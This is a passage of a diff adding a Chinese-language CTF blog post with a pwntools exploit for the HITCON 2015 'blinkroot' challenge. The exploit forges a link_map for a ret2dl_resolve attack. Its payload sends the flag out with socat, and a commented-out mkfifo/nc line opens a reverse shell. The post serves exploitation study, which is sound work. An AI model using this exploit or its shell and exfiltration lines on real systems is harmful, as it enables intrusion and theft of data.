+    <span class="c1">#fake_sym+=p32(0xffffffff)  #st_other should not be 0</span>
+    <span class="c1">#fake_sym+=p64(got_libc_address-0x8) # st_value should be got libc_address</span>
+    <span class="c1">#fake_sym=fake_sym.ljust(0x18,&#39;\x00&#39;)</span>
+    <span class="c1">#fake_link_map+= fake_sym</span>
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    
+    <span class="n">target_write</span><span class="o">=</span><span class="n">fake_addr</span><span class="o">+</span><span class="mh">0x28</span>
+    <span class="n">fake_jmprel</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">target_write</span><span class="o">-</span><span class="n">offset</span><span class="p">)</span>  <span class="c1">## offset </span>
+    <span class="n">fake_jmprel</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+    <span class="n">fake_jmprel</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">fake_jmprel</span>
+
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_addr</span><span class="p">)</span>      <span class="c1"># DT_STRTAB</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_addr</span><span class="o">+</span><span class="mh">0x78</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span> <span class="c1">#fake_DT_SYMTAB</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">got_libc_address</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># symtab_addr st-&gt;other==libc_address</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x18</span><span class="o">*</span><span class="n">reloc_index</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_addr</span><span class="o">+</span><span class="mh">0x80</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>  <span class="c1">#fake_DT_JMPREL</span>
+
+    <span class="k">return</span> <span class="n">fake_link_map</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="完整writeup">完整writeup</h1>
+<p>（基于ray-cp的<a href="https://github.com/ray-cp/pwn_category/blob/master/stack/ret2dl_resolve/hitcon2015-blinkroot/exp.py">exp</a>修改）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*- coding:utf-8 -*-</span>
+<span class="c1">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+<span class="c1"># r = remote(&#39;52.68.31.117&#39;, 9547)</span>
+<span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;./blinkroot&#39;</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">r</span>
+<span class="c1"># libc = ELF(&#34;/lib/i386-linux-gnu/libc-2.23.so&#34;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/lib/x86_64-linux-gnu/libc-2.23.so&#34;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">build_link_map</span><span class="p">(</span><span class="n">fake_addr</span><span class="p">,</span><span class="n">reloc_index</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">got_libc_address</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">    linkmap:
+</span><span class="s1">    0x00: START
+</span><span class="s1">    0x00: l_addr (offset from libc_address to target address
+</span><span class="s1">    0x08: 
+</span><span class="s1">    0x10: 
+</span><span class="s1">    0x14:
+</span><span class="s1">    0x15:
+</span><span class="s1">    0x18:
+</span><span class="s1">    0x20:
+</span><span class="s1">    0x28: # target address here
+</span><span class="s1">    0x30: fake_jmprel #r_offset 
+</span><span class="s1">    0x38:             #r_info should be 7
+</span><span class="s1">    0x40:             #r_addend 0
+</span><span class="s1">    0x48: 
+</span><span class="s1">    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
+</span><span class="s1">    0x70: p_DT_SYMTAB = fake_DT_SYMTAB
+</span><span class="s1">    0xf8: p_DT_JMPREL = fake_DT_JMPREL
+</span><span class="s1">    0x100: END
+</span><span class="s1">    typedef struct
+</span><span class="s1">    {
+</span><span class="s1">        Elf64_Word    st_name;        /* Symbol name (string tbl index) */
+</span><span class="s1">        unsigned char    st_info;        /* Symbol type and binding */
+</span><span class="s1">        unsigned char st_other;        /* Symbol visibility */
+</span><span class="s1">        Elf64_Section    st_shndx;        /* Section index */
+</span><span class="s1">        Elf64_Addr    st_value;        /* Symbol value */
+</span><span class="s1">        Elf64_Xword    st_size;        /* Symbol size */
+</span><span class="s1">    } Elf64_Sym;
+</span><span class="s1">    typedef struct
+</span><span class="s1">    {
+</span><span class="s1">        Elf64_Addr    r_offset;        /* Address */
+</span><span class="s1">        Elf64_Xword    r_info;            /* Relocation type and symbol index */
+</span><span class="s1">        Elf64_Sxword    r_addend;        /* Addend */
+</span><span class="s1">    } Elf64_Rela;
+</span><span class="s1">    &#39;&#39;&#39;</span>
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+
+    <span class="c1">#fake_sym=p32(0)  #st_name whatever</span>
+    <span class="c1">#fake_sym+=p32(0xffffffff)  #st_other should not be 0</span>
+    <span class="c1">#fake_sym+=p64(got_libc_address-0x8) # st_value should be got libc_address</span>
+    <span class="c1">#fake_sym=fake_sym.ljust(0x18,&#39;\x00&#39;)</span>
+    <span class="c1">#fake_link_map+= fake_sym</span>
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    
+    <span class="n">target_write</span><span class="o">=</span><span class="n">fake_addr</span><span class="o">+</span><span class="mh">0x28</span>
+    <span class="n">fake_jmprel</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">target_write</span><span class="o">-</span><span class="n">offset</span><span class="p">)</span>  <span class="c1">## offset </span>
+    <span class="n">fake_jmprel</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+    <span class="n">fake_jmprel</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">fake_jmprel</span>
+
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_addr</span><span class="p">)</span>      <span class="c1"># DT_STRTAB</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_addr</span><span class="o">+</span><span class="mh">0x78</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span> <span class="c1">#fake_DT_SYMTAB</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">got_libc_address</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># symtab_addr st-&gt;other==libc_address</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x18</span><span class="o">*</span><span class="n">reloc_index</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">fake_addr</span><span class="o">+</span><span class="mh">0x80</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>  <span class="c1">#fake_DT_JMPREL</span>
+
+    <span class="k">return</span> <span class="n">fake_link_map</span>
+
+
+<span class="n">addr</span><span class="o">=</span><span class="mh">0x600BC0</span>
+<span class="n">plt0</span><span class="o">=</span><span class="mh">0x600B40</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span><span class="o">-</span><span class="p">(</span><span class="n">addr</span><span class="o">-</span><span class="n">plt0</span><span class="p">))</span> 
+<span class="c1"># offset = 2**64-(addr-plt0) = 2**64-addr+plt0</span>
+<span class="c1"># addr + offset = 2**64+plt0</span>
+<span class="c1"># payload=p64(0x10000000000000000-(addr-plt0)) # 2^64</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># rcx dat+8</span>
+<span class="c1"># payload+=&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f&#34;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;cat flag | socat - TCP4:127.0.0.1:1234;</span><span class="se">\x00</span><span class="s2">&#34;</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">offset</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+<span class="n">got_libc_address</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+
+<span class="c1"># ret2dl_resolve=pdbg.ret2dl_resolve()</span>
+<span class="c1"># fake_link_map address is addr+0x100 </span>
+<span class="c1"># (0x0600cc0, 1, offset, start_main)</span>
+<span class="n">fake_link_map</span><span class="o">=</span><span class="n">build_link_map</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">got_libc_address</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">fake_link_map</span> <span class="c1"># 0x0600cc0</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="c1">#pdbg.bp(0x400575)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="s2">&#34;&#34;&#34;
+</span><span class="s2">set context-sections &#34;disasm&#34;
+</span><span class="s2">br *0x0040059d
+</span><span class="s2">
+</span><span class="s2">&#34;&#34;&#34;</span><span class="p">);</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+
+<span class="c1"># print(str(r.proc.pid))</span>
+
+<span class="c1"># gdb.attach(r, &#34;&#34;&#34;</span>
+<span class="c1"># heap</span>
+
+<span class="c1"># &#34;&#34;&#34;);</span>
+<span class="c1"># print(str(r.proc.pid))</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="参考">参考</h1>
+<ol>
+<li>
+<p><a href="https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#%E5%AE%9E%E4%BE%8Bhitcon2015blinkroot">https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#%E5%AE%9E%E4%BE%8Bhitcon2015blinkroot</a></p>
+</li>
+<li>
+<p><a href="https://ddaa.tw/hitcon_pwn_200_blinkroot.html">https://ddaa.tw/hitcon_pwn_200_blinkroot.html</a></p>
+</li>
+<li>
+<p><a href="https://dangokyo.me/2018/01/26/hitcon-2015-quals-pwn-blinkroot-write-up/">https://dangokyo.me/2018/01/26/hitcon-2015-quals-pwn-blinkroot-write-up/</a></p>
+</li>
+<li>
+<p><a href="https://delcoding.github.io/2019/03/ret2dl_resolve_x64/">https://delcoding.github.io/2019/03/ret2dl_resolve_x64/</a></p>
+</li>
+</ol>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">b1tg</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2019-11-21
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/ctf/">ctf</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/cve-2010-2883-analysis/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">CVE-2010-2883 Adobe Reader stack overflow 漏洞分析</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/linux-lazybinding/">
+            <span class="next-text nav-default">linux中的延迟绑定</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="http://github.com/b1tg" class="iconfont icon-github" title="github"></a>
+  <a href="https://b1tg.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2018 - 
+    2020
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">b1tg</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
